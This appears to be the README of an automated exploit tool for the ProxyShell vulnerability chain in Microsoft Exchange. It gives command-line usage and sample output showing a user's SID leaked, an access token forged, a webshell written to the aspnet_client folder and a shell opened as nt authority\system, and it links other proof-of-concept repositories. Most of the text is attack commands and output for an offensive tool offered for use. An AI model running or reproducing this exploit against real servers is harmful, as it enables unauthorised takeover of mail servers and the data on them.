# proxyshell-auto
```
usage: proxyshell.py [-h] -t T

Automatic Exploit ProxyShell

optional arguments:
  -h, --help  show this help message and exit
  -t T        Exchange URL
  
Usage: 
C:\>python3 proxyshell.py -t exchange.lab.local
fqdn exchange.lab.local
+ admin@exchange.lab.local
legacyDN /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=admin
leak_sid S-1-5-21-3626636094-1513906978-1376853856-1156
token VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBphZG1pbkB3b2huYmF1LXJhZGViZXJnLmNvbVUuUy0xL[snip]AAAA==
set_ews Success with subject badqxybxtecxuttq
write webshell at aspnet_client/tjmzk.aspx
<Response [404]>
<Response [404]>
nt authority\system
SHELL>
```
# Reference:
- https://github.com/dmaasland/proxyshell-poc
- https://github.com/ktecv2000/ProxyShell
- https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
